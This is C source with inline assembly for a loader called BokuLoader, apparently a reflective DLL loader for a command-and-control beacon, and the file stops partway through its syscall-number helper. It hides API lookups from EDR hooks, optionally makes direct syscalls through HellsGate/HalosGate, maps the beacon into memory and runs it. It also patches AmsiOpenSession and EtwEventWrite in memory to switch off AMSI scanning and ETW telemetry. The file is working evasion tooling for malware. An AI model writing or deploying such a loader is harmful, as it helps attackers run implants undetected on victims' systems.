#define WIN32_LEAN_AND_MEAN
/* Uncomment to enable features */
//#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
//#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
#include <windows.h>

void* getDllBase(void*) asm ("getDllBase");
void* getExportDirectory(void* dllAddr) asm ("getExportDirectory");
void* getExportAddressTable(void* dllBase, void* dllExportDirectory) asm ("getExportAddressTable");
void* getExportNameTable(void* dllBase, void* dllExportDirectory) asm ("getExportNameTable");
void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory) asm ("getExportOrdinalTable");
void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable) asm ("getSymbolAddress");
void* getRdllBase(void) asm ("getRdllBase");
void* getNewExeHeader(void* dllBase) asm ("getNewExeHeader");
void* getDllSize(void* newExeHeader) asm ("getDllSize");
void* getDllSizeOfHeaders(void* newExeHeader) asm ("getDllSizeOfHeaders");
void* copyMemory(void* Size, void* source, void* destination) asm ("copyMemory");
void* getOptionalHeader(void* NewExeHeader) asm ("getOptionalHeader");
void* getSizeOfOptionalHeader(void* NewExeHeader) asm ("getSizeOfOptionalHeader");
void* add(void* , void* ) asm ("add");
void* getNumberOfSections(void* newExeHeaderAddr) asm ("getNumberOfSections");
void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr) asm ("getBeaconEntryPoint");
#ifdef SYSCALLS
void* findSyscallNumber(void* ntdllApiAddr) asm ("findSyscallNumber");
void* HellsGate(void* wSystemCall) asm ("HellsGate");
void* HellDescent() asm ("HellDescent");
void* halosGateDown(void* ntdllApiAddr, void* index) asm ("halosGateDown");
void* halosGateUp(void* ntdllApiAddr, void* index) asm ("halosGateUp");
DWORD getSyscallNumber(void* functionAddress) asm ("getSyscallNumber");
#endif

typedef struct Export {
    void* Directory;
    void* AddressTable;
    void* NameTable;
    void* OrdinalTable;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    void* size;
    void* SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    void* NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    void* TextSectionSize;
    Export Export;
}Dll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    void* SizeOfSection;
}Section;

typedef void*  (WINAPI * tLoadLibraryA)  (char*);
typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
typedef void*  (NTAPI  * tNtFlush)       (HANDLE, PVOID, unsigned long);
typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned long, void* );

#ifdef SYSCALLS
typedef void*  (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, unsigned long, PVOID);
typedef void*  (NTAPI  * tNtAlloc)       (HANDLE, PVOID, unsigned long, PVOID, unsigned long, unsigned long);
typedef void*  (NTAPI  * tNtFree)        (HANDLE, PVOID, PVOID, unsigned long);
#else
typedef void*  (WINAPI * tVirtualAlloc)  (void*, SIZE_T, unsigned long, unsigned long);
typedef void*  (WINAPI * tVirtualProtect)(void*, SIZE_T, unsigned long, unsigned long*);
typedef void*  (WINAPI * tVirtualFree)   (void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);
#endif

#ifdef BYPASS
#ifdef SYSCALLS
typedef void*  (NTAPI  * tNtWrite)       (HANDLE, PVOID, PVOID, unsigned long, PVOID);
#else
typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
#endif
void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
    Dll ntdll;
    ntdll.dllBase             = (void*)getDllBase(ws_ntdll);
    ntdll.Export.Directory    = (void*)getExportDirectory(   (void*)ntdll.dllBase);
    ntdll.Export.AddressTable = (void*)getExportAddressTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable    = (void*)getExportNameTable(   (void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = (void*)getExportOrdinalTable((void*)ntdll.dllBase, ntdll.Export.Directory);

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K',0,'E',0,'R',0,'N',0,'E',0,'L',0,'3',0,'2',0,'.',0,'D',0,'L',0,'L',0,0};
    Dll k32;
    k32.dllBase               = (void*)getDllBase(ws_k32);
    k32.Export.Directory      = (void*)getExportDirectory(   (void*)k32.dllBase);
    k32.Export.AddressTable   = (void*)getExportAddressTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable      = (void*)getExportNameTable(   (void*)k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)k32.dllBase, k32.Export.Directory);

    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA     = (tLoadLibraryA)  getSymbolAddress(kstr1, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr2[] = {'G','e','t','P','r','o','c','A'};
    tGetProcAddress pGetProcAddress = (tGetProcAddress)getSymbolAddress(kstr2, (void*)8,  k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);

    #ifdef SYSCALLS
    // HalosGate/HellsGate to get the systemcall numbers
    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtFlushSyscallNumber = getSyscallNumber(pNtFlushInstructionCache);

    char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtAlloc pNtAllocateVirtualMemory = getSymbolAddress(ntstr2, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtAllocSyscallNumber = getSyscallNumber(pNtAllocateVirtualMemory);

    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, (void*)22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtProtSyscallNumber = getSyscallNumber(pNtProtectVirtualMemory);

    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtFree pNtFreeVirtualMemory = getSymbolAddress(ntstr4, (void*)19, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtFreeSyscallNumber = getSyscallNumber(pNtFreeVirtualMemory);
    #else
    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = (tNtFlush)getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    char kstr3[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    tVirtualAlloc pVirtualAlloc      = (tVirtualAlloc)getSymbolAddress(kstr3, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr4[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(kstr4, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr5[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
    tVirtualFree pVirtualFree        = (tVirtualFree)getSymbolAddress(kstr5, (void*)11, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    #endif

    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA);
    #endif

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = (void*)getRdllBase();
    rdll_src.NewExeHeader         = (void*)getNewExeHeader(        rdll_src.dllBase);
    rdll_src.size                 = (void*)getDllSize(             rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(    rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = (void*)getOptionalHeader(      rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = (void*)getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = (void*)getNumberOfSections(    rdll_src.NewExeHeader);

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase = NULL;
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtAllocSyscallNumber);
    HellDescent((HANDLE)-1, &rdll_dst.dllBase, 0, &rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #else
    //__debugbreak();
    rdll_dst.dllBase = (void*)pVirtualAlloc(NULL, (SIZE_T)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #endif

    // Optionally write Headers from initial source RDLL to loading beacon destination memory
    #ifdef NOHEADERCOPY
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtFreeSyscallNumber);
    // 0x00008000 -> MEM_RELEASE
    SIZE_T RegionSize = 1;
    HellDescent((HANDLE)-1, &rdll_dst.dllBase, &RegionSize, 0x00008000); // Deallocate the first memory page (4096/0x1000 bytes)
    #else
    pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
    #endif
    #else
    //__debugbreak();
    copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);
    #endif

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag   = FALSE;
    DWORD numberOfSections = (DWORD)rdll_src.NumberOfSections;
    rdll_src.NthSection    = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add eax, 0xC \n" // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "mov eax, [eax] \n"
            : "=r" (section.RVA) // EAX OUT
            : "r" (rdll_src.NthSection) // EAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add eax, 0x14 \n" // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "mov eax, [eax] \n"
            : "=r" (section.PointerToRawData) // EAX OUT
            : "r" (rdll_src.NthSection) // EAX IN
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add eax, 0x10 \n" // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "mov eax, [eax] \n"
            : "=r" (section.SizeOfSection) // EAX OUT
            : "r" (rdll_src.NthSection) // EAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov ebx, [eax] \n" // name of the section
                "mov eax, 0x0 \n"
                "mov edx, 0x7865742e \n" // 0x7865742e == '.tex'
                "cmp ebx, edx \n"
                "jne nottext \n"
                "mov eax, 0x1 \n"
                "nottext: \n"
                : "=r" (textSectionFlag) // EAX OUT
                : "r" (rdll_src.NthSection) // EAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            if(textSectionFlag == TRUE)
            {
                rdll_dst.TextSection = section.dst_rdll_VA;
                rdll_dst.TextSectionSize = section.SizeOfSection;
            }
        }
        // Copy the section from the source address to the destination for the size of the section
        copyMemory(section.SizeOfSection, section.src_rdll_VA, section.dst_rdll_VA);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src.NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src.OptionalHeader + 0x68;
    // Get the Address of the Import Directory from the Data Directory
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *importName, *LookupTableEntry, *AddressTableEntry, *EntryName, *len_EntryName, *nullCheck;
    __asm__(
        "mov ebx, [eax] \n"  // RVA of Import Directory
        "add edx, ebx \n"    // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg eax, edx \n"
        : "=r" (ImportDirectory) // EAX OUT
        : "r" (DataDirectory), // EAX IN
          "r" (rdll_dst.dllBase)     // EDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "add edx, 0xC \n"        // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov edx, [edx] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "add eax, edx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),  // EDX OUT
          "=r" (importName) // EAX OUT
        : "r" (rdll_dst.dllBase), // EAX IN
          "r" (nImportDesc)// EDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = (void*)getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = (void*)pLoadLibraryA((char*)(importName));
        }
        __asm__(
            "mov eax, [eax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add eax, edx \n"        // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            : "=r" (LookupTableEntry) // EAX OUT
            : "r" (nImportDesc), // EAX IN
              "r" (rdll_dst.dllBase) // EDX IN
        );
        __asm__(
            "add eax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
            "mov ebx, [eax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add ebx, edx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg eax, ebx \n"
            : "=r" (AddressTableEntry) // EAX OUT
            : "r" (nImportDesc), // EAX IN
              "r" (rdll_dst.dllBase) // EDX IN
        );
        __asm__(
            "mov eax, [eax] \n"
            : "=r" (nullCheck) // EAX OUT
            : "r" (AddressTableEntry) // EAX IN
        );
        while(nullCheck)
        {
            dll_import.Export.Directory    = getExportDirectory(   dll_import.dllBase);
            dll_import.Export.AddressTable = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NameTable    = getExportNameTable(   dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.OrdinalTable = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "add eax, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov eax, [eax] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
                    : "=r" (BaseOrdinal) // EAX OUT
                    : "r" (dll_import.Export.Directory) // EAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov eax, [eax] \n"        // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n"       // get rid of the 8
                    : "=r" (importEntryHint) // EAX OUT
                    : "r" (LookupTableEntry) // EAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub eax, edx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex) // EAX OUT
                    : "r" (importEntryHint), // EAX IN
                      "r" (BaseOrdinal) // EDX IN
                );
                 __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                    "mov esi, edx \n"
                    "mov ebx, 0x4 \n"           // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul ebx \n"               // importEntryExportTableIndex * sizeof(DWORD)
                    "add eax, esi \n"          // RVA for our functions address
                    "mov eax, [eax] \n"        // The RVA for the executable function we are importing
                    "add eax, ecx \n" // The executable address within the imported DLL for the function we imported
                    : "=r" (EntryAddress)                 // EAX OUT
                    : "r"(TableIndex),                       // EAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable),  // EDX IN - AddressTable
                      "r" (dll_import.dllBase)                  // ECX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [eax], edx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry),  // EAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)             // EDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov eax, [eax] \n" // RVA for our functions Name/Hint table entry
                    "add eax, edx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add eax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)  // EAX OUT
                    : "r" (AddressTableEntry), // EAX IN = import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (rdll_dst.dllBase) // EDX IN
                );
                __asm__(
                    "xor ecx, ecx \n"   // Get the string length for the import function name
                    "countLoop: \n"
                    "inc cl \n"         // increment the name string length counter
                    "xor ebx, ebx \n"
                    "cmp bl, [eax] \n"  // are we at the null terminator for the string?
                    "je fStrLen \n"
                    "inc eax \n"        // move to the next char of the string
                    "jmp short countLoop \n"
                    "fStrLen: \n"
                    "xchg eax, ecx \n"
                    : "=r" (len_EntryName) // EAX OUT
                    : "r" (EntryName) // EAX IN
                );
                // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                EntryAddress = getSymbolAddress(EntryName, len_EntryName, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
                // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
                if (EntryAddress == NULL){
                    EntryAddress = (void*)pGetProcAddress((HMODULE)dll_import.dllBase, (char*)EntryName);
                }
                __asm__(
                    "mov [eax], edx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // EAX IN = import table entry we are going to overwrite
                      "r" (EntryAddress) // EDX IN
                );
            }
            AddressTableEntry += 0x4;
            if(LookupTableEntry)
                LookupTableEntry += 0x4; // TODO: not sure here
            __asm__(
                "mov eax, [eax] \n"
                : "=r" (nullCheck) // EAX OUT
                : "r" (AddressTableEntry) // EAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "add eax, 0xC \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov eax, [eax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name 
            "add edx, eax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
            : "=r" (importName),       // EDX OUT
              "=r" (importNameRVA)  // EAX OUT
            : "r" (nImportDesc),      // EAX IN
              "r" (rdll_dst.dllBase)  // EDX IN
        );
    }
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add edx, 0x1c \n"  // OptionalHeader.ImageBase
        "mov edx, [edx] \n"
        "sub eax, edx \n"   // dllBase.ImageBase
        : "=r" (BaseAddressDelta)
        : "r" (rdll_dst.dllBase),
          "r" (rdll_src.OptionalHeader)
    );
    void* RelocDir = rdll_src.OptionalHeader + 0x88; // OptionalHeader+0x88 = &DataDirectory[Base Relocation Table]
    __asm__(
        "add eax, [edx] \n" // 4 byte DWORD Virtual Address of the Relocation Directory table, newRelocationTableAddr = dllBase + RVAnewRelocationTable
        : "=r" (nextRelocBlock)   // EAX OUT
        : "r" (rdll_dst.dllBase), // EAX IN
          "r" (RelocDir)          // EDX IN
    );
    __asm__(
        "mov eax, [eax+0x4] \n" // 4 byte DWORD Size of the Relocation Directory table
        : "=r" (RelocDirSize) // EAX OUT
        : "r" (RelocDir)      // EAX IN
    );
    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
    {
        __asm__(
            "mov eax, [eax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            : "=r" (relocBlockSize) // EAX OUT
            : "r" (nextRelocBlock)  // EAX IN
        );
        while(relocBlockSize)
        {
            __asm__(
                "add eax, [edx] \n"   // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress + nextRelocationBlockRVA = VA of next Relocation Block
                : "=r" (relocVA) // EAX OUT
                : "r" (rdll_dst.dllBase), // EAX IN
                  "r" (nextRelocBlock) // EDX IN
            );
            __asm__(
                "xor edx, edx \n"
                "mov ebx, 0x2 \n" // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"       // relocBlockSize/2
                : "=r" (RelocBlockEntries) // EAX OUT
                : "r" (relocBlockSize)     // EAX IN
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor ebx, ebx \n"
                    "mov bx, [eax] \n"   // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov eax, ebx \n"
                    "shr ebx, 0x0C \n"   // Check the 4 bit type
                    "cmp bl, 0x3 \n"    // IMAGE_REL_BASED_HIGHLOW?
                    "jne badtype \n"
                    "shl eax, 0x14 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr eax, 0x14 \n"   // the last 12 bits is the offset, the first 4 bits is the type
                    "add edx, eax \n"    // in memory Virtual Address of our current relocation entry
                    "mov ebx, [edx] \n"  // value of the relocation entry
                    "add ebx, ecx \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [edx], ebx \n"  // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    : "r" (nextRelocBlockEntry), // EAX IN
                      "r" (relocVA), // EDX IN
                      "r" (BaseAddressDelta) // ECX IN
                );
                nextRelocBlockEntry += 0x2; // TODO: is this correct?
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "mov eax, [eax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                : "=r" (relocBlockSize) // EAX OUT
                : "r" (nextRelocBlock)  // EAX IN
            );
        }
    }
    unsigned long oldprotect = 0;
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
    HellDescent((HANDLE)-1, &rdll_dst.TextSection, &rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);

    HellsGate((void*)(ULONG_PTR)NtFlushSyscallNumber);
    HellDescent((HANDLE)-1, NULL, 0 );
    #else
    pVirtualProtect(rdll_dst.TextSection, (SIZE_T)rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);
    pNtFlushInstructionCache((void*)-1, NULL, 0);
    #endif
   
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
    ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

#ifdef BYPASS
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
    PVOID Base;
    SIZE_T Size;
    unsigned long oldprotect;
    SIZE_T bytesWritten;

    #ifdef SYSCALLS
    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, (void*)22, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
    DWORD NtProtSyscallNumber = getSyscallNumber(pNtProtectVirtualMemory);
    #else
    char vp[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(vp, (void*)14, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
    #endif
    // ######### AMSI.AmsiOpenSession Bypass
    char as[] = {'a','m','s','i','.','d','l','l',0};
    Dll amsi;
    amsi.dllBase = (void*)getDllBase((void*)as); // check if amsi.dll is already loaded into the process
    if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        amsi.dllBase = (void*)pLoadLibraryA((char*)(as));
    }

    if (amsi.dllBase != NULL) {
        amsi.Export.Directory      = (void*)getExportDirectory(   (void*)amsi.dllBase);
        amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NameTable      = (void*)getExportNameTable(   (void*)amsi.dllBase, amsi.Export.Directory);
        amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
        void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);

        unsigned char amsibypass[] = { 0x31, 0xC0 }; // xor eax, eax
        Base = pAmsiOpenSession;
        Size = sizeof(amsibypass);

        #ifdef SYSCALLS
        // make memory region RWX
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        copyMemory((void*)sizeof(amsibypass), amsibypass, pAmsiOpenSession);
        // make memory region RX again
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
        #else
        // make memory region RWX
        pVirtualProtect(pAmsiOpenSession, sizeof(amsibypass), PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        copyMemory((void*)sizeof(amsibypass), amsibypass, pAmsiOpenSession);
        // make memory region RX again
        pVirtualProtect(pAmsiOpenSession, sizeof(amsibypass), oldprotect, &oldprotect);
        #endif
    }

    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    void* pEtwEventWrite  = getSymbolAddress(eew, (void*)13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);

    if (pEtwEventWrite != NULL) {
        unsigned char etwbypass[] = { 0xc3 }; // ret
        Base = pEtwEventWrite;
        Size = sizeof(etwbypass);
        #ifdef SYSCALLS
        // make memory region RWX
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        copyMemory((void*)sizeof(etwbypass), etwbypass, pEtwEventWrite);
        // make memory region RX again
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
        #else
        // make memory region RWX
        pVirtualProtect(pEtwEventWrite, sizeof(etwbypass), PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        copyMemory((void*)sizeof(etwbypass), etwbypass, pEtwEventWrite);
        // make memory region RX again
        pVirtualProtect(pEtwEventWrite, sizeof(etwbypass), oldprotect, &oldprotect);
        #endif
    }
    return;
}
#endif

#ifdef SYSCALLS
DWORD getSyscallNumber(void* functionAddress)
{
    DWORD syscallNumber = (DWORD)(ULONG_PTR)findSyscallNumber(functionAddress);
    if (syscallNumber == 0) {
        DWORD index = 0;
        while (syscallNumber == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            syscallNumber = (DWORD)(ULONG_PTR)halosGateUp(functionAddress, (void*)(ULONG_PTR)index);
            if (syscallNumber) {
                syscallNumber = syscallNumber - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
